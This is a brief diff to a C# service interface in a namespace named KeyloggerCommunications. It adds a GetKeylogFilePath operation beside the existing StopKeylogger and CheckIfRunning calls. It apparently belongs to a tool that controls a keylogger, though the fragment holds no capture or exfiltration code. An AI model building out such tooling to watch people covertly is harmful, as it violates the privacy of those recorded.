@@ -27,6 +27,9 @@ namespace KeyloggerCommunications
         bool StopKeylogger();
 
         [OperationContract]
+        String GetKeylogFilePath();
+
+        [OperationContract]
         bool CheckIfRunning();
     }
 }
